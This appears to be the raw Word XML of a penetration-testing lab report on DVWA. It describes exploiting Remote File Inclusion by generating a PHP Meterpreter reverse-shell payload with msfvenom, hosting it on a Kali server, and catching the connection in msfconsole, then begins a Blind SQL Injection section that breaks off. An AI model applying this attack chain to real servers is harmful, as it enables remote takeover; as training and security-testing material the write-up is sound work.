          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="64F6B226" wp14:editId="3A01F6BB">
            <wp:extent cx="6800850" cy="440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91069" cy="4458927"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="242CAD05" w14:textId="6BAB2823" w:rsidR="00254D5A" w:rsidRDefault="00254D5A" w:rsidP="00254D5A">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00E3170E">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidR="00E3170E">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Kali Homepage Loaded on DVWA File Inclusion Page</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EA3811E" w14:textId="0149C22C" w:rsidR="00492C33" w:rsidRPr="00FC60A7" w:rsidRDefault="00E3170E" w:rsidP="00FC60A7">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>The application loads an external page when its full URL is entered in the parameter meaning that this page is also vulnerable to Remote File Inclusion attacks.</w:t>
      </w:r>
      <w:r w:rsidR="00254D5A" w:rsidRPr="00254D5A">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>If the file included contained executable server-side code such as code written in PHP, this code will be executed by the server, allowing a malicious actor to remotely execute commands. This would make a full system compromise very likely.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1890C677" w14:textId="3ADB03E7" w:rsidR="00872054" w:rsidRDefault="00872054" w:rsidP="007D0171">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
          <w:color w:val="FF0000"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="643F5698" w14:textId="0EADD3F7" w:rsidR="00FC60A7" w:rsidRPr="008D0AB1" w:rsidRDefault="00FC60A7" w:rsidP="00FC60A7">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="18" w:name="_Hlk67660511"/>
      <w:r w:rsidRPr="008D0AB1">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>2.</w:t>
      </w:r>
      <w:r w:rsidR="00ED0E81">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>2.</w:t>
      </w:r>
      <w:r w:rsidRPr="008D0AB1">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>Uploading Malicious File To Exploit Remote File Inclusion Further</w:t>
      </w:r>
    </w:p>
    <w:bookmarkEnd w:id="18"/>
    <w:p w14:paraId="4B146271" w14:textId="1AE5236A" w:rsidR="00492C33" w:rsidRDefault="008D0AB1" w:rsidP="007D0171">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">To further demonstrate the security issue of allowing the inclusion of remote files, </w:t>
      </w:r>
      <w:r w:rsidR="00ED0E81">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">a malicious PHP </w:t>
      </w:r>
      <w:r w:rsidR="00ED0E81">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>file</w:t>
      </w:r>
      <w:r w:rsidR="00ED0E81">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00ED0E81">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>meterpreter_shell.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00ED0E81">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r w:rsidR="00ED0E81">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> was </w:t>
      </w:r>
      <w:r w:rsidR="00ED0E81">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">hosted on </w:t>
      </w:r>
      <w:r w:rsidR="00ED0E81">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>Adelaja’s</w:t>
      </w:r>
      <w:r w:rsidR="00ED0E81">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00ED0E81">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">Kali </w:t>
      </w:r>
      <w:r w:rsidR="00ED0E81">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>web server and requested</w:t>
      </w:r>
      <w:r w:rsidR="00ED0E81">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> using the page parameter on the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>File Inclusion page of the DVWA website</w:t>
      </w:r>
      <w:r w:rsidR="00ED0E81">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00ED0E81">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>to further exploit this vulnerability</w:t>
      </w:r>
      <w:r w:rsidR="00ED0E81">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25EC64F0" w14:textId="78E90AF3" w:rsidR="00ED0E81" w:rsidRDefault="00ED0E81" w:rsidP="007D0171">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1F55FC39" w14:textId="0B001754" w:rsidR="00ED0E81" w:rsidRDefault="00ED0E81" w:rsidP="007D0171">
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">Msfvenom is used to generate the stand-alone Metasploit payload used in the malicious PHP Script. The </w:t>
      </w:r>
      <w:r w:rsidRPr="00ED0E81">
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>php/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00ED0E81">
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>meterpreter_reverse_tcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00ED0E81">
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>payload is used to create a shell that connects back to the attacking machine</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>[Figure 4.1]</w:t>
      </w:r>
      <w:r w:rsidRPr="007F4713">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> As the payload is already in PHP format, using the -f and -o options </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>outputs</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> and pipes the raw PHP code into the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>meterpreter_shell.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> file</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04B5862E" w14:textId="77777777" w:rsidR="00ED0E81" w:rsidRPr="00ED0E81" w:rsidRDefault="00ED0E81" w:rsidP="007D0171">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="68388100" w14:textId="67945091" w:rsidR="00680902" w:rsidRDefault="00680902" w:rsidP="007D0171">
      <w:pPr>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="073797BC" wp14:editId="18FF2B67">
            <wp:extent cx="6685915" cy="2695575"/>
            <wp:effectExtent l="0" t="0" r="63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6693738" cy="2698729"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B13DE00" w14:textId="5F55F6E6" w:rsidR="00680902" w:rsidRDefault="00680902" w:rsidP="00680902">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidR="00ED0E81">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Msfvenom Generating Payload</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="209ECF3F" w14:textId="77777777" w:rsidR="00ED0E81" w:rsidRDefault="00ED0E81" w:rsidP="00680902">
      <w:r>
        <w:t xml:space="preserve">The generated payload file is stored on a web server with an accessible IP or domain name, in this scenario, and for proof of concept, the payload file is stored on Kali’s localhost which is in the /var/www/html directory. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07D07EA9" w14:textId="77777777" w:rsidR="00ED0E81" w:rsidRDefault="00ED0E81" w:rsidP="00680902"/>
    <w:p w14:paraId="197D7291" w14:textId="335BC7DA" w:rsidR="00680902" w:rsidRDefault="00ED0E81" w:rsidP="00680902">
      <w:r>
        <w:t>Before starting the remote inclusion, a handler</w:t>
      </w:r>
      <w:r w:rsidRPr="00ED0E81">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">is </w:t>
      </w:r>
      <w:r>
        <w:t>set up</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> in </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>msfconsole</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> to catch the payload before the page is executed</w:t>
      </w:r>
      <w:r w:rsidR="007D2FD3">
        <w:t>[Figure 4.2] [Figure4.3]</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="404C90EF" w14:textId="62FA0176" w:rsidR="00680902" w:rsidRPr="00680902" w:rsidRDefault="00680902" w:rsidP="00680902">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3370106D" wp14:editId="161924A7">
            <wp:extent cx="6825615" cy="4733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6826238" cy="4734357"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FE3A5CA" w14:textId="543810B4" w:rsidR="00680902" w:rsidRDefault="00680902" w:rsidP="007D2FD3">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00ED0E81">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>MsfConsole</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00ED0E81">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Multi Handle Listening for reverse Connection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="073BC9D1" w14:textId="6AD8DAA6" w:rsidR="007D2FD3" w:rsidRDefault="007D2FD3" w:rsidP="007D2FD3">
      <w:pPr>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="519DCAD5" wp14:editId="5582FE66">
            <wp:extent cx="6858000" cy="3463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05152" cy="3487741"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B6C1335" w14:textId="058A21FA" w:rsidR="007D2FD3" w:rsidRDefault="007D2FD3" w:rsidP="007D2FD3">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidR="00ED0E81">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Setting Listening IP Address And Port To Match Generated Payload</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F3E22C0" w14:textId="1C1890A7" w:rsidR="00ED0E81" w:rsidRDefault="00ED0E81" w:rsidP="007D2FD3">
      <w:r>
        <w:t>The payload now stored as a remote file on a remote server will be included in the URL of DVWA’s File Inclusion page[Figure4.4].</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Running this page should provide a </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>meterpreter</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> session on </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>msfconsole</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>[Figure4.</w:t>
      </w:r>
      <w:r>
        <w:t>5</w:t>
      </w:r>
      <w:r>
        <w:t>].</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> The </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>meterpreter</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> commands </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00ED0E81">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>getuid</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00ED0E81">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>ps</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> can be used to see what privileges the current session has on the exploited target and the list of running processes, respectively.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D8A44F9" w14:textId="78F78F57" w:rsidR="00ED0E81" w:rsidRDefault="00ED0E81" w:rsidP="007D2FD3">
      <w:pPr>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4C42EB59" wp14:editId="6341370C">
            <wp:extent cx="6800850" cy="2306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6891118" cy="2336932"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BADB0B1" w14:textId="5DC09C9A" w:rsidR="00ED0E81" w:rsidRPr="00ED0E81" w:rsidRDefault="00ED0E81" w:rsidP="00ED0E81">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Payload File Included in File Inclusion URL</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76DBF090" w14:textId="37AD890E" w:rsidR="00ED0E81" w:rsidRDefault="00ED0E81" w:rsidP="007D2FD3">
      <w:pPr>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="176FBB39" wp14:editId="753E0C23">
            <wp:extent cx="6800850" cy="184785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05576" cy="1876305"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="02AAF5D4" w14:textId="4D730996" w:rsidR="00ED0E81" w:rsidRPr="00ED0E81" w:rsidRDefault="00ED0E81" w:rsidP="00ED0E81">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>5</w:t>
      </w:r>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Open Meterpreter Session</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F512958" w14:textId="77777777" w:rsidR="00ED0E81" w:rsidRPr="00ED0E81" w:rsidRDefault="00ED0E81" w:rsidP="007D2FD3">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="32AB76EC" w14:textId="77777777" w:rsidR="00FC60A7" w:rsidRPr="00ED0E81" w:rsidRDefault="00FC60A7" w:rsidP="007D2FD3">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
          <w:iCs/>
          <w:color w:val="0070C0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00ED0E81">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi"/>
          <w:iCs/>
          <w:color w:val="0070C0"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>SQL Injection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10941C2B" w14:textId="3B0ADE2B" w:rsidR="00ED0E81" w:rsidRPr="00FF06BD" w:rsidRDefault="00ED0E81" w:rsidP="00ED0E81">
      <w:bookmarkStart w:id="19" w:name="_Hlk67651479"/>
      <w:r w:rsidRPr="00420339">
        <w:t xml:space="preserve">During the exploitation phase, Adelaja </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">will attempt to exploit </w:t>
      </w:r>
      <w:r>
        <w:t>a Blind SQL Injection vulnerability</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> within the DVWA website. </w:t>
      </w:r>
      <w:r w:rsidRPr="00FF06BD">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>The end goal for the tester is to attempt to penetrate the target system gaining as much access privilege as possible. Adelaja will stay within the scope determined during pre-engagement.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D095FB6" w14:textId="77777777" w:rsidR="00ED0E81" w:rsidRDefault="00ED0E81" w:rsidP="00ED0E81">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0BA9848A" w14:textId="3A1828E3" w:rsidR="00ED0E81" w:rsidRPr="008D0AB1" w:rsidRDefault="00ED0E81" w:rsidP="00ED0E81">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:iCs/>
          <w:color w:val="0070C0"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>3.</w:t>
      </w:r>
      <w:r w:rsidRPr="008D0AB1">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:iCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>1.Checking For Vulnerability</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3103F6B8" w14:textId="7484CEE9" w:rsidR="007F4713" w:rsidRDefault="00ED0E81" w:rsidP="00ED0E81">
      <w:pPr>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">Before proceeding to develop the exploit. The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>DVWA website</w:t>
      </w:r>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> is </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>tested</w:t>
      </w:r>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> to find any</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> parameters</w:t>
      </w:r>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> vulnerable</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>an SQL</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> attack before trying to leverage information obtained to get access to the system</w:t>
      </w:r>
      <w:r w:rsidRPr="00E34B94">
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:bookmarkEnd w:id="19"/>
      <w:r>
        <w:rPr>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
